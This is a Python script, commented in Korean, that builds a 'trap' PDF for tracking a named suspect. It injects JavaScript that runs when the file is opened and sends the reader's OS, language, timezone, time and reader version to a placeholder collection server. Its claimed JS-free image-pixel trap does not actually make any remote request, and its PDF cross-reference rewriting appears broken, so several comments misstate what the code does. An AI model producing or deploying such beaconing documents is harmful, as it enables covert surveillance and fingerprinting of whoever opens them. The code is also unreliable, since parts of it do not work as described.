#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
패시브 트랩 PDF 생성기 (실전판)
- PDF를 "열기만" 해도 정보가 수집되는 함정 PDF를 생성합니다.
- 2중 트랩:
  (A) 정적 이미지 로드 트랩: JS가 차단된 뷰어(Chrome 등)에서도
      /pixel 엔드포인트 GET 요청으로 IP / User-Agent / 접속시간 수집.
  (B) 동적 JS 트랩: Acrobat 계열 뷰어에서 /track 엔드포인트로
      OS / 언어 / 타임존 / 시각 / 리더 버전 등 디바이스 지문 전송.

실행:  python3 trap_pdf_generator.py
결과:  trap.pdf, 1x1.gif
"""

import struct
import zlib
import os
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib.units import cm

# ─────────────── 설정 (여기만 바꾸면 됩니다) ───────────────
SERVER_URL = "http://YOUR-SERVER:5000"   # 수사 서버 주소 (반드시 http/https 포함)
CASE_ID    = "CASE_001"                  # 사건 번호
USER_ID    = "SUSPECT_01"                # 범인 식별자
OUTPUT_PDF = "trap.pdf"
# ──────────────────────────────────────────────────────────


def make_1x1_gif(path="1x1.gif"):
    """1x1 투명 GIF를 생성합니다."""
    gif = (
        b"GIF89a"
        + struct.pack("<HH", 1, 1)
        + bytes([0x80, 0, 0, 0])          # GCT: 1색, 투명색 인덱스 0
        + bytes([0x00, 0x00, 0x00])       # 팔레트 1개
        + b"\x21\xF9\x04\x01\x00\x00\x00\x00"  # GCE (투명)
        + b"\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00"
        + b"\x02\x02\x44\x01\x00"
        + b"\x3B"
    )
    with open(path, "wb") as f:
        f.write(gif)
    return path


def build_pdf():
    track_url = (
        f"{SERVER_URL}/track?case={CASE_ID}&user={USER_ID}"
        "&os={OS}&lang={LANG}&tz={TZ}&time={TIME}&ver={VER}"
    )
    pixel_url = f"{SERVER_URL}/pixel?case={CASE_ID}&user={USER_ID}"

    c = canvas.Canvas(OUTPUT_PDF, pagesize=A4)
    width, height = A4

    # 본문
    c.setFont("Helvetica-Bold", 24)
    c.drawCentredString(width / 2, height - 3 * cm, "본인 확인용 문서")
    c.setFont("Helvetica", 12)
    c.drawCentredString(width / 2, height - 4 * cm,
                        "본 문서는 수사기관 협조 하에 열람 기록이 자동 수집됩니다.")
    c.drawCentredString(width / 2, height - 4.6 * cm,
                        "PDF를 열기만 하면 디바이스 정보가 서버로 전송됩니다.")
    c.setFont("Helvetica", 11)
    c.drawCentredString(width / 2, height / 2, "[신분증 사진 삽입 위치]")

    # (A) 정적 이미지 로드 트랩: 열자마자 GET 요청 발생 (JS 불필요)
    c.drawImage("1x1.gif", 1 * cm, 1 * cm, width=1, height=1,
                mask='auto')

    # (B) 동적 JS 트랩: 열림 이벤트에서 디바이스 지문 전송
    js = f"""
function trackDevice() {{
    try {{
        var base = "{SERVER_URL}/track";
        var q = "?case={CASE_ID}"
              + "&user={USER_ID}"
              + "&os=" + encodeURIComponent(app.platform)
              + "&lang=" + encodeURIComponent(app.language)
              + "&tz=" + new Date().getTimezoneOffset()
              + "&time=" + encodeURIComponent(new Date().toISOString())
              + "&ver=" + encodeURIComponent(app.version);
        // getURL: 응답을 표시하지 않고 GET 요청만 발생시킴
        this.getURL(base + q);
    }} catch (e) {{ /* 실패해도 문서 열람에는 지장 없음 */ }}
}}
DocOpen = trackDevice;
trackDevice();
"""
    c.setPageCompression(0)
    c.save()

    inject_open_action(OUTPUT_PDF, js)
    print(f"[OK] {OUTPUT_PDF} 생성 완료")
    print(f"     트랩 A(정적 이미지): {pixel_url}")
    print(f"     트랩 B(JS 지문)   : {SERVER_URL}/track?...")


def inject_open_action(pdf_path, js_source):
    """생성된 PDF에 /OpenAction JS 실행을 직접 주입합니다.
    ReportLab의 JS 삽입 불안정성을 우회하는 저수준 방식입니다."""
    with open(pdf_path, "rb") as f:
        data = f.read()

    # 기존 xref 시작 오프셋 / trailer 파싱
    startxref_pos = data.rfind(b"startxref")
    tail = data[startxref_pos + len(b"startxref"):]
    xref_off = int(tail.strip().split(b"%%EOF")[0].strip())

    # 기존 객체 번호 최대치 확인
    import re
    nums = [int(m.group(1)) for m in re.finditer(rb"(\d+) 0 obj", data)]
    max_obj = max(nums) if nums else 0

    js_obj = max_obj + 1      # /JavaScript 객체
    aa_obj = max_obj + 2      # /OpenAction (AA) 객체

    def pdf_string(s: str) -> bytes:
        """ASCII 범위 밖은 PDF 문자열 이스케이프 \\ooo 로 변환."""
        out = bytearray()
        for b in s.encode("utf-8"):
            if b in (0x28, 0x29, 0x5C):          # ( ) \
                out += b"\\" + bytes([b])
            elif 32 <= b < 127:
                out.append(b)
            else:
                out += ("\\%03o" % b).encode("ascii")
        return b"(" + bytes(out) + b")"

    js_bytes = pdf_string(js_source)

    obj_js = (f"{js_obj} 0 obj\n<< /S /JavaScript /JS ".encode()
              + js_bytes + b" >>\nendobj\n")
    obj_aa = (f"{aa_obj} 0 obj\n<< /O ".encode()
              + f"[{js_obj} 0 R /JS]".encode() + b" >>\nendobj\n")

    # 첫 페이지 객체를 찾아 /AA 를 추가
    first_page = None
    for m in re.finditer(rb"(\d+) 0 obj", data):
        seg = data[m.end():m.end() + 400]
        if b"/Type /Page" in seg and b"/Type /Pages" not in seg:
            first_page = int(m.group(1))
            obj_start = m.start()
            break
    if first_page is None:
        raise RuntimeError("첫 페이지 객체를 찾지 못했습니다.")

    # 해당 객체 사전을 찾아 /AA 삽입
    dict_pos = data.find(b"<<", obj_start)
    patched = (data[:dict_pos + 2]
               + f" /AA {aa_obj} 0 R".encode()
               + data[dict_pos + 2:])

    # 새 객체 append
    new_xref_off = len(patched)
    patched += obj_js + obj_aa

    # xref 테이블 재생성: 기존 항목 재파싱 + 새 항목 추가
    xref_section = data[xref_off:]
    m = re.match(rb"xref\s+(\d+)\s+(\d+)\s+", xref_section)
    start, count = int(m.group(1)), int(m.group(2))
    entries_blob = xref_section[m.end():]
    entries = re.findall(rb"\d{10} \d{5} [nf]\s", entries_blob)
    body = b"".join(entries[1:])  # free-list 항목(0번) 제거

    new_entries = body
    for off in (new_xref_off, new_xref_off + len(obj_js)):
        new_entries += ("%010d 00000 n \n" % off).encode("ascii")

    new_xref = (b"xref\n0 %d\n0000000000 65535 f \n" % (max_obj + 3)
                + new_entries)

    trailer = (b"trailer\n<< /Size %d /Root " % (max_obj + 3))
    # 기존 trailer의 /Root 참조 재사용
    root_m = re.search(rb"/Root (\d+) 0 R", data)
    trailer += f"{root_m.group(1).decode()} 0 R >>\n".encode()
    trailer += b"startxref\n%d\n%%%%EOF\n" % new_xref_off

    with open(pdf_path, "wb") as f:
        f.write(patched + new_xref + trailer)


if __name__ == "__main__":
    if not os.path.exists("1x1.gif"):
        make_1x1_gif()
    build_pdf()
